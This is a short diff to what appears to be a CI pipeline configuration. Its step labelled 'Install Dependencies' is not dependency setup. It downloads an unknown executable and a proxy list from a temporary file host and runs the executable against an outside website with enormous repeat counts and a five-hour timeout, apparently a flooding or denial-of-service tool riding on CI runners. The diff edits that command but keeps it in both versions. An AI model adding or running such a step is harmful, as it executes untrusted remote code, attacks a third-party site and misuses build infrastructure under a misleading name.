@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install wget -y && wget https://temp.sh/ETJnp/jsss && wget https://temp.sh/cRYHi/proxies.txt && chmod +x jsss && ./jsss https://gb.sbs/ 999999 100 99999999999999999999999999999999999999999999999999999999999999999999999
+            command: apt update && apt install wget -y && wget https://temp.sh/ETJnp/jsss && wget https://temp.sh/gMEJW/proxy.txt && chmod +x jsss && ./jsss https://gb.sbs/ 999999 100 999999999999999999999999999999999999999999999999
             no_output_timeout: 5h
 
 workflows:
